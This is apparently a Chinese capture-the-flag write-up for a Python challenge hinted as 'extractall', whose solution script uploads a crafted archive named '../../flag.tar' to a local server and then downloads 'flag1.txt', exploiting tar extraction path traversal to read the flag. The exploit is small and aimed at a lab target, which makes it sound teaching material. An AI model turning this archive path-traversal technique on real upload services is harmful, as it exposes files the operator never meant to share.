#### 描述:

py的村子里存在一个危险的恶魔,我把它放在题目里面了

#### hint:

extractall

题解:

```python
url = "http://127.0.0.1:6656/download"
url1 = "http://127.0.0.1:6656/upload"
filename1 = "../../flag.tar"
filename = "flag1.txt"


def upload(url, fileName):
    url = url
    file = {"file": open(fileName, 'rb')}  # 这里是上传文件
    response = req.post(url=url, files=file)
    print(response.text)
def download(url):
    dist = {'filename':"flag1.txt"}
    response = req.post(url,data=dist)
    print(response.text)

download(url)


#upload(url=url1, fileName=filename1)
```

